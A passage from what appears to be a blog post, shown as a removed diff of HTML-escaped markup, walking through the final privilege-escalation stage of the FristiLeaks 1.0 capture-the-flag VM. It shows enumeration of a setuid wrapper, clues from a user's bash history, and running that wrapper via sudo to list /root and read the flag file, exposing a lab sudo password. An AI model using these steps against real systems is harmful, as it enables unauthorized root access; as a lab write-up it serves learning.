-</span><span class='line'>    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY<span class="p">&amp;</span>rdquo<span class="p">;</span>,
-</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/sbin:/bin:/usr/sbin:/usr/bin&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;User fristigod may run the following commands on this host:
-</span><span class='line'>    <span class="o">(</span>fristi : ALL<span class="o">)</span> /var/fristigod/.secret_admin_stuff/doCom
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>After checking the file <code>/var/fristigod/.secret_admin_stuff/doCom</code>, I know this binary is owned by <code>root</code> and the sticky bit has been set. It will allow people to run command as ROOT.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ls -al /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>ls -al /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>-rwsr-sr-x <span class="m">1</span> root root <span class="m">7529</span> Nov <span class="m">25</span> 05:53 /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>bash-4.1<span class="nv">$ </span>strings /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>strings /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>/lib64/ld-linux-x86-64.so.2
-</span><span class='line'>&lt;strong&gt;gmon_start&lt;/strong&gt;
-</span><span class='line'>libc.so.6
-</span><span class='line'>setuid
-</span><span class='line'><span class="nb">exit</span>
-</span><span class='line'>strcat
-</span><span class='line'>stderr
-</span><span class='line'>system
-</span><span class='line'>getuid
-</span><span class='line'>fwrite
-</span><span class='line'>__libc_start_main
-</span><span class='line'>GLIBC_2.2.5
-</span><span class='line'>fff.
-</span><span class='line'>fffff.
-</span><span class='line'>l<span class="nv">$ </span>L
-</span><span class='line'>t<span class="k">$(</span>L
-</span><span class='line'><span class="p">|</span><span class="nv">$0H</span>
-</span><span class='line'>Nice try, but wrong user <span class="p">;</span><span class="k">)</span>
-</span><span class='line'>Usage: ./program_name terminal_command <span class="p">&amp;</span>hellip<span class="p">;</span>
-</span><span class='line'>bash-4.1<span class="err">$</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>But when I run the binary file <code>/var/fristigod/.secret_admin_stuff/doCom</code>, I got wrong user error message :(`</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>id
-</span><span class='line'>id
-</span><span class='line'><span class="nv">uid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span>
-</span><span class='line'>bash-4.1<span class="nv">$ </span>/var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>/var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>Nice try, but wrong user <span class="p">;</span><span class="o">)</span>
-</span><span class='line'>bash-4.1<span class="err">$</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>After further enumeration&hellip; I finally got clues in <code>/var/fristigod/.bash_history</code></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>cat .bash_history
-</span><span class='line'>cat .bash_history
-</span><span class='line'>ls
-</span><span class='line'><span class="nb">pwd</span>
-</span><span class='line'>ls -lah
-</span><span class='line'><span class="nb">cd</span> .secret_admin_stuff/
-</span><span class='line'>ls
-</span><span class='line'>./doCom
-</span><span class='line'>./doCom <span class="nb">test</span>
-</span><span class='line'>sudo ls
-</span><span class='line'><span class="nb">exit</span>
-</span><span class='line'><span class="nb">cd</span> .secret_admin_stuff/
-</span><span class='line'>ls
-</span><span class='line'>./doCom
-</span><span class='line'>sudo -u fristi ./doCom ls /
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
-</span><span class='line'><span class="nb">exit</span>
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'><span class="nb">exit</span>
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'><span class="nb">exit</span>
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'><span class="nb">exit</span>
-</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'><span class="nb">exit</span>
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'><span class="nb">exit</span>
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>groups
-</span><span class='line'>ls -lah
-</span><span class='line'>usermod -G fristigod fristi
-</span><span class='line'><span class="nb">exit</span>
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>less /var/log/secure e
-</span><span class='line'>Fexit
-</span><span class='line'><span class="nb">exit</span>
-</span><span class='line'><span class="nb">exit</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Let&rsquo;s go rooting now!</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom <span class="p">&amp;</span>lsquo<span class="p">;</span>ls -al /root<span class="p">&amp;</span>rsquo<span class="p">;</span>
-</span><span class='line'><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> fristigod: LetThereBeFristi!&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;total 48
-</span><span class='line'>dr-xr-x<span class="p">&amp;</span>mdash<span class="p">;</span>.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">25</span> 04:09 .
-</span><span class='line'>dr-xr-xr-x. <span class="m">22</span> root root <span class="m">4096</span> Dec <span class="m">27</span> 17:50 ..
-</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-   <span class="m">1</span> root root <span class="m">1936</span> Nov <span class="m">25</span> 06:10 .bash_history
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root   <span class="m">18</span> May <span class="m">20</span>  <span class="m">2009</span> .bash_logout
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root  <span class="m">176</span> May <span class="m">20</span>  <span class="m">2009</span> .bash_profile
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root  <span class="m">176</span> Sep <span class="m">22</span>  <span class="m">2004</span> .bashrc
-</span><span class='line'>drwxr-xr-x.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">25</span> 05:53 .c
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root  <span class="m">100</span> Sep <span class="m">22</span>  <span class="m">2004</span> .cshrc
-</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-.  <span class="m">1</span> root root <span class="m">1291</span> Nov <span class="m">17</span> 06:51 .mysql_history
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root  <span class="m">129</span> Dec  <span class="m">3</span>  <span class="m">2004</span> .tcshrc
-</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-.  <span class="m">1</span> root root  <span class="m">829</span> Nov <span class="m">17</span> 09:17 .viminfo
-</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-.  <span class="m">1</span> root root  <span class="m">246</span> Nov <span class="m">17</span> 12:19 fristileaks_secrets.txt
-</span><span class='line'>bash-4.1<span class="nv">$ </span>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom <span class="p">&amp;</span>lsquo<span class="p">;</span>cat /root/fristileaks_secrets.txt<span class="p">&amp;</span>rsquo<span class="p">;</span>
-</span><span class='line'>stileaks_secrets.txt<span class="err">&#39;</span>ristigod/.secret_admin_stuff/doCom <span class="p">&amp;</span>lsquo<span class="p">;</span>cat /root/fri
-</span><span class='line'>Congratulations on beating FristiLeaks 1.0 by Ar0xA <span class="o">[</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://tldr.nu&quot;</span>&gt;https://tldr.nu&lt;/a&gt;<span class="o">]</span>&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;I wonder <span class="k">if</span> you beat it in the maximum <span class="m">4</span> hours it<span class="p">&amp;</span>rsquo<span class="p">;</span>s supposed to take!&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Shoutout to people of <span class="c">#fristileaks (twitter) and #vulnhub (FreeNode)&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Flag: Y0u_kn0w_y0u_l0ve_fr1st1&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;bash-4.1<span class="err">$</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Done..</p>
 ]]></content>
   </entry>
   
